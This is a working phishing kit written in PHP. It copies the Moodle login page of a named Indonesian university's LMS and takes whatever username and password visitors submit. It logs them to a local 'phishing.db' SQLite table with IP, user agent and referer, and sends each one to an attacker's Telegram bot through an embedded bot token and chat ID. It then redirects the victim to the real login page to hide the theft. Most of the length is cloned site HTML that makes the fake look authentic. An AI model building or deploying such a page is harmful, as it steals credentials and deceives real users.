<?php
// SQLite database configuration
$db_file = __DIR__ . '/phishing.db';

try {
    // Create (if not exists) and open the SQLite database
    $db = new SQLite3($db_file);
    
    // Create table if not exists
    $sql = "CREATE TABLE IF NOT EXISTS credentials (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        username TEXT NOT NULL,
        password TEXT NOT NULL,
        ip_address TEXT NOT NULL,
        user_agent TEXT NOT NULL,
        referer TEXT,
        timestamp TEXT NOT NULL,
        created_at DATETIME DEFAULT CURRENT_TIMESTAMP
    )";
    
    if (!$db->exec($sql)) {
        error_log("Error creating table: " . $db->lastErrorMsg());
    }
} catch (Exception $e) {
    die("Database error: " . $e->getMessage());
}

// Telegram bot configuration
$BOT_TOKEN = '8394213465:AAFcQ5Cmr5j0FLC5WqfHaGuezRl1IPOERuo';
$CHAT_ID = '1127003304'; // Ganti dengan chat ID Anda

// Process form submission
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    // Debug: Log that POST was received
    error_log("POST request received at " . date('Y-m-d H:i:s'));
    
    $username = $_POST['username'] ?? '';
    $password = $_POST['password'] ?? '';
    
    error_log("Username: " . $username);
    error_log("Password: " . $password);
    
    if (!empty($username) && !empty($password)) {
        error_log("Processing credentials...");
        
        // Log to SQLite database
        logToDatabase($username, $password, $db);
        
        // Send to Telegram
        sendToTelegram($username, $password);
        
        // Redirect to real login page
        header('Location: https://lms.calvin.ac.id/login/index.php');
        exit;
    } else {
        error_log("Empty username or password");
    }
}

// Function to log credentials to SQLite database
function logToDatabase($username, $password, $db) {
    try {
        $ip = $_SERVER['REMOTE_ADDR'];
        $user_agent = SQLite3::escapeString($_SERVER['HTTP_USER_AGENT']);
        $referer = isset($_SERVER['HTTP_REFERER']) ? SQLite3::escapeString($_SERVER['HTTP_REFERER']) : 'Direct';
        $timestamp = date('Y-m-d H:i:s');
        
        $stmt = $db->prepare(
            "INSERT INTO credentials 
            (username, password, ip_address, user_agent, referer, timestamp) 
            VALUES (:username, :password, :ip, :user_agent, :referer, :timestamp)"
        );
        
        $stmt->bindValue(':username', $username, SQLITE3_TEXT);
        $stmt->bindValue(':password', $password, SQLITE3_TEXT);
        $stmt->bindValue(':ip', $ip, SQLITE3_TEXT);
        $stmt->bindValue(':user_agent', $user_agent, SQLITE3_TEXT);
        $stmt->bindValue(':referer', $referer, SQLITE3_TEXT);
        $stmt->bindValue(':timestamp', $timestamp, SQLITE3_TEXT);
        
        if ($stmt->execute()) {
            return true;
        } else {
            error_log("Error logging to database: " . $db->lastErrorMsg());
            return false;
        }
    } catch (Exception $e) {
        error_log("Database error: " . $e->getMessage());
        return false;
    }
}

function sendToTelegram($username, $password) {
    global $BOT_TOKEN, $CHAT_ID;
    
    $ip = $_SERVER['REMOTE_ADDR'];
    $user_agent = $_SERVER['HTTP_USER_AGENT'];
    $time = date('Y-m-d H:i:s');
    $referer = $_SERVER['HTTP_REFERER'] ?? 'Direct';
    
    $message = "🔐 **NEW LOGIN CAPTURED**\n\n";
    $message .= "👤 **Username:** `$username`\n";
    $message .= "🔑 **Password:** `$password`\n";
    $message .= "🌐 **IP Address:** `$ip`\n";
    $message .= "🖥️ **User Agent:** `$user_agent`\n";
    $message .= "📅 **Time:** `$time`\n";
    $message .= "🔗 **Referer:** `$referer`\n";
    $message .= "📍 **URL:** `{$_SERVER['HTTP_HOST']}{$_SERVER['REQUEST_URI']}`";
    
    $url = "https://api.telegram.org/bot{$BOT_TOKEN}/sendMessage";
    
    $data = [
        'chat_id' => $CHAT_ID,
        'text' => $message,
        'parse_mode' => 'Markdown'
    ];
    
    $options = [
        'http' => [
            'header' => "Content-type: application/x-www-form-urlencoded\r\n",
            'method' => 'POST',
            'content' => http_build_query($data)
        ]
    ];
    
    $context = stream_context_create($options);
    @file_get_contents($url, false, $context);
}
?>
<!DOCTYPE html>
<html dir="ltr" lang="en" xml:lang="en">
<head>
    <title>Log in to the site | LMS CIT</title>
    <link rel="shortcut icon" href="https://lms.calvin.ac.id/theme/image.php/moove/theme/1762133415/favicon">
    <meta http-equiv="Content-Type" content="text/html; charset=utf-8">
    <meta name="keywords" content="moodle, Log in to the site | LMS CIT">
    <link rel="stylesheet" type="text/css" href="https://lms.calvin.ac.id/theme/yui_combo.php?rollup/3.18.1/yui-moodlesimple-min.css">
    <script id="firstthemesheet" type="text/css">/** Required in order to fix style inclusion problems in IE with YUI **/</script>
    <link rel="stylesheet" type="text/css" href="https://lms.calvin.ac.id/theme/styles.php/moove/1762133415_1/all">
    <link rel="stylesheet" type="text/css" href="https://lms.calvin.ac.id/local/accessibility/styles.css">
    <link rel="stylesheet" type="text/css" href="https://lms.calvin.ac.id/local/accessibility/styles.php">
    <script>
//<![CDATA[
var M = {}; M.yui = {};
M.pageloadstarttime = new Date();
M.cfg = {"wwwroot":"https:\/\/lms.calvin.ac.id","homeurl":{},"sesskey":"ZgCynZ4h5K","sessiontimeout":"3600","sessiontimeoutwarning":"300","themerev":"1762133415","slasharguments":1,"theme":"moove","iconsystemmodule":"core\/icon_system_fontawesome","jsrev":"1762133415","admin":"admin","svgicons":true,"usertimezone":"Asia\/Jakarta","courseId":1,"courseContextId":2,"contextid":1,"contextInstanceId":0,"langrev":1762133415,"templaterev":"1762133415"};
//]]>
</script>

<meta name="robots" content="noindex">
<link rel="preconnect" href="https://fonts.googleapis.com">
<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin="">
<link href="https://fonts.googleapis.com/css2?family=Roboto:ital,wght@0,300;0,400;0,500;0,700;1,400&display=swap" rel="stylesheet">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
</head>

<body id="page-login-index" class="format-site  path-login chrome dir-ltr lang-en yui-skin-sam yui3-skin-sam lms-calvin-ac-id pagelayout-login course-1 context-1 notloggedin theme moove-login">
<div class="toast-wrapper mx-auto py-0 fixed-top" role="status" aria-live="polite"></div>

<div id="page-wrapper">

    <div>
    <a class="sr-only sr-only-focusable" href="#maincontent">Skip to main content</a>
</div>
<script src="https://lms.calvin.ac.id/lib/javascript.php/1762133415/lib/polyfills/polyfill.js"></script>
<script src="https://lms.calvin.ac.id/theme/yui_combo.php?rollup/3.18.1/yui-moodlesimple-min.js"></script>
<script src="https://lms.calvin.ac.id/lib/javascript.php/1762133415/lib/javascript-static.js"></script>
<script>
//<![CDATA[
document.body.className += ' jsenabled';
//]]>
</script>

    <div id="page" class="container-fluid mt-0">
        <div id="page-content" class="row d-flex justify-content-center">
            <div id="region-main-box" class="col-lg-7 col-md-7 col-xs-12">
                <section id="region-main" class="col-12 h-100" aria-label="Content"><span id="user-notifications"></span>
                    <div class="login-wrapper">
                        <div class="login-container">
                            <div role="main"><span id="maincontent"></span><div class="loginform row " style="background-color: rgba(108, 117, 124, 0.3);">
    <div class="col">
            <div id="loginlogo" class="login-logo">
                <img id="logoimage" src="https://instructure-uploads-apse1.s3.ap-southeast-1.amazonaws.com/account_203730000000000001/attachments/651/logo-calvin-white-02.png" class="img-fluid" style="max-width:30%;" alt="LMS Calvin Institute of Technology">
                <h1 class="login-heading sr-only">Log in to LMS Calvin Institute of Technology</h1>
            </div>

        <form class="login-form" method="post" id="login">
            <input type="hidden" name="logintoken" value="Sb3D9LokEG0KAtpuMXDuQdeGCRGUx5OS">
            <div class="login-form-username form-group">
                <p style="font-size:16px; font-weight:700; color:white;">Email</p>
                <label for="username" class="sr-only">
                        Username or email
                </label>
                <input type="text" name="username" id="username" class="form-control form-control-lg" value="" placeholder="Username or email" autocomplete="username" style="margin-top: -5%; border-radius:2px;">
            </div>
            <div class="login-form-password form-group">
                <p style="font-size:16px; font-weight:700; color:white;">Password</p>
                <label for="password" class="sr-only">Password</label>
                <input type="password" name="password" id="password" value="" class="form-control form-control-lg" placeholder="Password" autocomplete="current-password" style="margin-top:-5px; border-radius:2px;">
            </div>
           
            <div style="display:flex; justify-content: space-between;">
                 <a href="https://lms.calvin.ac.id/login/forgot_password.php" class="login-form-forgotpassword text-left" style="width:50%; margin-top:3%; color:white;">Lost password?</a>
                 <button class="btn btn-primary btn-block btn-lg login-form-submit" style="background-color:transparent; border-color: #fff; border-width: 2; width:50%;" type="submit" id="loginbtn">Log in</button>
            </div>
        </form>
                <form method="post" id="guestlogin" class="mt-2">
                    <input type="hidden" name="logintoken" value="Sb3D9LokEG0KAtpuMXDuQdeGCRGUx5OS">
                    <input type="hidden" name="username" value="guest">
                    <input type="hidden" name="password" value="guest">
                    <button class="btn btn-secondary btn-block" type="submit" hidden="">Access as a guest</button>
                </form>
            <div class="d-flex mt-2">
                <button type="button" class="ml-auto btn btn-link" data-modal="alert" data-modal-title-str="[&quot;cookiesenabled&quot;, &quot;core&quot;]" data-modal-content-str="[&quot;cookiesenabled_help_html&quot;, &quot;core&quot;]" hidden=""><i class="fa fa-question-circle"></i> Cookies notice</button>
            </div>
    </div>
</div><div id="local-accessibility-buttoncontainer" class="local-accessibility-buttoncontainer">
    <button type="button" class="btn btn-primary" title="Accessibility">
        <i class="fa fa-universal-access"></i>
    </button>
</div><div class="local-accessibility-panel border-primary p-0 card col-10 col-lg-8" style="display: none;">
    <div class="card-header bg-primary text-light">
        <i class="fa fa-universal-access"></i>
        Accessibility
        <a href="javascript:void(0);" id="local-accessibility-closebtn" class="float-right text-light text-decoration-none">
            <i class="fa fa-times"></i>
        </a>
    </div>
    <div class="card-body">
        <div class="container">
            <div class="row">
                <div class="container-fluid text-right mb-2">
                    <a href="https://lms.calvin.ac.id/local/accessibility/resetall.php?returnurl=https%3A%2F%2Flms.calvin.ac.id%2Flogin%2Findex.php&amp;sesskey=ZgCynZ4h5K" class="btn btn-secondary">
                        Reset All
                    </a>
                </div>
            </div>
            <div class="row">
                    <div class="col-6 card">
                        <div class="card-body backgroundcolour-container">
                            <p>
                                <strong>
                                    
                                    Background Colour
                                </strong>
                            </p>
                            <div class="container" id="accessibility_backgroundcolour-container">
    <input type="color" name="color" value="">
    <button type="button" class="btn btn-light accessibility_backgroundcolour-resetbtn">
        Reset
    </button>
</div>
                        </div>
                    </div>
                    <div class="col-12 col-md-6 card">
                        <div class="card-body fontface-container">
                            <p>
                                <strong>
                                    
                                    Font Face
                                </strong>
                            </p>
                            <div class="container" id="accessibility_fontface-container">
    <div class="btn-group-vertical w-100">
        <button type="button" class="btn btn-light accessibility_fontface-resetbtn">
            Reset
        </button>
        <button type="button" class="btn btn-light accessibility_fontface-classbtn" data-value="serif" style="font-family: none !important;">
            Serif
        </button>
        <button type="button" class="btn btn-light accessibility_fontface-classbtn" data-value="sansserif" style="font-family: sans-serif !important;">
            Sans Serif
        </button>
        <button type="button" class="btn btn-light accessibility_fontface-classbtn" data-value="dyslexic" style="font-family: opendyslexic !important;">
            Dyslexic
        </button>
    </div>
</div>
                        </div>
                    </div>
                    <div class="col-12 col-md-6 card">
                        <div class="card-body fontsize-container">
                            <p>
                                <strong>
                                    
                                    Font Size
                                </strong>
                            </p>
                            <div class="container">
    <div class="row">
        <div class="col-1 px-0">
            <button type="button" class="btn btn-light text-center" id="accessibility_fontsize-btndown">
                -
            </button>
        </div>
        <div class="col-8 px-1 py-2">
            <input type="range" class="form-range w-100" min="0.5" max="2" step="0.25" id="accessibility_fontsize-input" value="1" data-default="1">
        </div>
        <div class="col-2 px-2 py-2" id="accessibility_fontsize-label">
            1
        </div>
        <div class="col-1 px-0">
            <button type="button" class="btn btn-light text-center" id="accessibility_fontsize-btnup">
                +
            </button>
        </div>
    </div>
    <div class="row">
        <div class="col-12">
            <button type="button" class="w-100 btn btn-sm btn-light" id="accessibility_fontsize-btnreset">
                Reset
            </button>
        </div>
    </div>
</div>
                        </div>
                    </div>
                    <div class="col-6 card">
                        <div class="card-body textcolour-container">
                            <p>
                                <strong>
                                    
                                    Text Colour
                                </strong>
                            </p>
                            <div class="container" id="accessibility_textcolour-container">
    <input type="color" name="color" value="">
    <button type="button" class="btn btn-light accessibility_textcolour-resetbtn">
        Reset
    </button>
</div>
                        </div>
                    </div>
                    <div class="col-12 col-md-6 card">
                        <div class="card-body fontkerning-container">
                            <p>
                                <strong>
                                    
                                    Font Kerning
                                </strong>
                            </p>
                            <div class="container" id="accessibility_fontkerning-container">
    <div class="btn-group">
        <button type="button" class="btn btn-light btn-toggler">Turn off</button>
    </div>
</div>
                        </div>
                    </div>
                    <div class="col-12 col-md-6 card">
                        <div class="card-body imagevisibility-container">
                            <p>
                                <strong>
                                    
                                    Image Visibility
                                </strong>
                            </p>
                            <div class="container" id="accessibility_imagevisibility-container">
    <div class="btn-group">
        <button type="button" class="btn btn-light btn-toggler">Hide Images</button>
    </div>
</div>
                        </div>
                    </div>
                    <div class="col-12 col-md-6 card">
                        <div class="card-body letterspacing-container">
                            <p>
                                <strong>
                                    
                                    Letter Spacing
                                </strong>
                            </p>
                            <div class="container">
    <div class="row">
        <div class="col-1 px-0">
            <button type="button" class="btn btn-light text-center" id="accessibility_letterspacing-btndown">
                -
            </button>
        </div>
        <div class="col-8 px-1 py-2">
            <input type="range" class="form-range w-100" min="-0.1" max="0.5" step="0.1" id="accessibility_letterspacing-input" value="0" data-default="0">
        </div>
        <div class="col-2 px-2 py-2" id="accessibility_letterspacing-label">
            0
        </div>
        <div class="col-1 px-0">
            <button type="button" class="btn btn-light text-center" id="accessibility_letterspacing-btnup">
                +
            </button>
        </div>
    </div>
    <div class="row">
        <div class="col-12">
            <button type="button" class="w-100 btn btn-sm btn-light" id="accessibility_letterspacing-btnreset">
                Reset
            </button>
        </div>
    </div>
</div>
                        </div>
                    </div>
                    <div class="col-12 col-md-6 card">
                        <div class="card-body lineheight-container">
                            <p>
                                <strong>
                                    
                                    Line Height
                                </strong>
                            </p>
                            <div class="container">
    <div class="row">
        <div class="col-1 px-0">
            <button type="button" class="btn btn-light text-center" id="accessibility_lineheight-btndown">
                -
            </button>
        </div>
        <div class="col-8 px-1 py-2">
            <input type="range" class="form-range w-100" min="0.5" max="3" step="0.1" id="accessibility_lineheight-input" value="1.2" data-default="1.2">
        </div>
        <div class="col-2 px-2 py-2" id="accessibility_lineheight-label">
            1.2
        </div>
        <div class="col-1 px-0">
            <button type="button" class="btn btn-light text-center" id="accessibility_lineheight-btnup">
                +
            </button>
        </div>
    </div>
    <div class="row">
        <div class="col-12">
            <button type="button" class="w-100 btn btn-sm btn-light" id="accessibility_lineheight-btnreset">
                Reset
            </button>
        </div>
    </div>
</div>
                        </div>
                    </div>
                    <div class="col-12 col-md-6 card">
                        <div class="card-body linkhighlight-container">
                            <p>
                                <strong>
                                    
                                    Link Highlight
                                </strong>
                            </p>
                            <div class="container" id="accessibility_linkhighlight-container">
    <div class="btn-group">
        <button type="button" class="btn-toggler btn-light">Disabled</button>
    </div>
</div>
                        </div>
                    </div>
            </div>
        </div>
    </div>
</div></div>
                        </div>
                    </div>
                </section>
            </div>
        </div>
    </div>
</div>

<div class="d-none">
    <div class="tool_dataprivacy"><a href="https://lms.calvin.ac.id/admin/tool/dataprivacy/summary.php">Data retention summary</a></div>
<a class="mobilelink" href="https://download.moodle.org/mobile?version=2023100900.06&amp;lang=en&amp;iosappid=633359593&amp;androidappid=com.moodle.moodlemobile&amp;siteurl=https%3A%2F%2Flms.calvin.ac.id">Get the mobile app</a>
    <script>
//<![CDATA[
var require = {
    baseUrl : 'https://lms.calvin.ac.id/lib/requirejs.php/1762133415/',
    enforceDefine: true,
    skipDataMain: true,
    waitSeconds : 0,
    paths: {
        jquery: 'https://lms.calvin.ac.id/lib/javascript.php/1762133415/lib/jquery/jquery-3.7.1.min',
        jqueryui: 'https://lms.calvin.ac.id/lib/javascript.php/1762133415/lib/jquery/ui-1.13.2/jquery-ui.min',
        jqueryprivate: 'https://lms.calvin.ac.id/lib/javascript.php/1762133415/lib/requirejs/jquery-private'
    },
    map: {
      '*': { jquery: 'jqueryprivate' },
      '*': { process: 'core/first' },
      jqueryprivate: { jquery: 'jquery' }
    }
};
//]]>
</script>
<script src="https://lms.calvin.ac.id/lib/requirejs/require.min.js"></script>
<script>
//<![CDATA[
M.util.js_pending("core/first");
require(['core/first'], function() {
require(['core/prefetch'])
;
M.util.js_pending('filter_mathjaxloader/loader'); require(['filter_mathjaxloader/loader'], function(amd) {amd.configure({"mathjaxconfig":"MathJax.Hub.Config({\r\n    config: [\"Accessible.js\", \"Safe.js\"],\r\n    errorSettings: { message: [\"!\" },\r\n    skipStartupTypeset: true,\r\n    messageStyle: \"none\"\r\n});\r\n","lang":"en"}); M.util.js_complete('filter_mathjaxloader/loader');});;
require(["media_videojs/loader"], function(loader) {
    loader.setUp('en');
});;
M.util.js_pending('local_accessibility/colourwidget'); require(['local_accessibility/colourwidget'], function(amd) {amd.init("accessibility_backgroundcolour", "backgroundcolour", "background-color", "accessibility-backgroundcolour", "body, body *:not(.mediaplugin, .mediaplugin *, .qnbutton *, .filter_mathjaxloader_equation *, img)"); M.util.js_complete('local_accessibility/colourwidget');});;
M.util.js_pending('accessibility_fontface/script'); require(['accessibility_fontface/script'], function(amd) {amd.init(); M.util.js_complete('accessibility_fontface/script');});;
M.util.js_pending('accessibility_fontsize/script'); require(['accessibility_fontsize/script'], function(amd) {amd.init(null); M.util.js_complete('accessibility_fontsize/script');});;
M.util.js_pending('local_accessibility/colourwidget'); require(['local_accessibility/colourwidget'], function(amd) {amd.init("accessibility_textcolour", "textcolour", "color", "accessibility-textcolour"); M.util.js_complete('local_accessibility/colourwidget');});;
M.util.js_pending('accessibility_fontkerning/script'); require(['accessibility_fontkerning/script'], function(amd) {amd.init(null); M.util.js_complete('accessibility_fontkerning/script');});;
M.util.js_pending('accessibility_imagevisibility/script'); require(['accessibility_imagevisibility/script'], function(amd) {amd.init(null); M.util.js_complete('accessibility_imagevisibility/script');});;
M.util.js_pending('accessibility_letterspacing/script'); require(['accessibility_letterspacing/script'], function(amd) {amd.init(null); M.util.js_complete('accessibility_letterspacing/script');});;
M.util.js_pending('accessibility_lineheight/script'); require(['accessibility_lineheight/script'], function(amd) {amd.init(null); M.util.js_complete('accessibility_lineheight/script');});;
M.util.js_pending('accessibility_linkhighlight/script'); require(['accessibility_linkhighlight/script'], function(amd) {amd.init(null); M.util.js_complete('accessibility_linkhighlight/script');});;
    M.util.js_pending('theme_boost/loader');
    require(['theme_boost/loader'], function() {
      M.util.js_complete('theme_boost/loader');
    });
;
M.util.js_pending('local_accessibility/panel'); require(['local_accessibility/panel'], function(amd) {amd.init(); M.util.js_complete('local_accessibility/panel');});;
M.util.js_pending('core/notification'); require(['core/notification'], function(amd) {amd.init(1, []); M.util.js_complete('core/notification');});;
M.util.js_pending('core/log'); require(['core/log'], function(amd) {amd.setConfig({"level":"warn"}); M.util.js_complete('core/log');});;
M.util.js_pending('core/page_global'); require(['core/page_global'], function(amd) {amd.init(); M.util.js_complete('core/page_global');});;
M.util.js_pending('core/utility'); require(['core/utility'], function(amd) {M.util.js_complete('core/utility');});
    M.util.js_complete("core/first");
});
//]]>
</script>
<script type="text/x-mathjax-config">MathJax.Hub.Config({
    config: ["Accessible.js", "Safe.js"],
    errorSettings: { message: ["!"] },
    skipStartupTypeset: true,
    messageStyle: "none"
});
</script>
<script src="https://cdn.jsdelivr.net/npm/mathjax@2.7.9/MathJax.js?delayStartupUntil=configured"></script>
<script>
//<![CDATA[
M.str = {"moodle":{"lastmodified":"Last modified","name":"Name","error":"Error","info":"Information","yes":"Yes","no":"No","cancel":"Cancel","confirm":"Confirm","areyousure":"Are you sure?","closebuttontitle":"Close","unknownerror":"Unknown error","file":"File","url":"URL","collapseall":"Collapse all","expandall":"Expand all"},"repository":{"type":"Type","size":"Size","invalidjson":"Invalid JSON string","nofilesattached":"No files attached","filepicker":"File picker","logout":"Logout","nofilesavailable":"No files available","norepositoriesavailable":"Sorry, none of your current repositories can return files in the required format.","fileexistsdialogheader":"File exists","fileexistsdialog_editor":"A file with that name has already been attached to the text you are editing.","fileexistsdialog_filemanager":"A file with that name has already been attached","renameto":"Rename to \"{$a}\"","referencesexist":"There are {$a} links to this file","select":"Select"},"admin":{"confirmdeletecomments":"Are you sure you want to delete the selected comments?","confirmation":"Confirmation"},"accessibility_fontkerning":{"turnonkerning":"Turn on","turnoffkerning":"Turn off"},"accessibility_imagevisibility":{"hideimages":"Hide Images","showimages":"Show Images"},"accessibility_linkhighlight":{"enabled":"Enabled","disabled":"Disabled"},"debug":{"debuginfo":"Debug info","line":"Line","stacktrace":"Stack trace"},"langconfig":{"labelsep":": "}};
//]]>
</script>
<script>
//<![CDATA[
(function() {M.util.help_popups.setup(Y);
 M.util.js_pending('random6924d7d4579382'); Y.on('domready', function() { M.util.js_complete("init");  M.util.js_complete('random6924d7d4579382'); });
})();
//]]>
</script>

</div>

</body>
</html>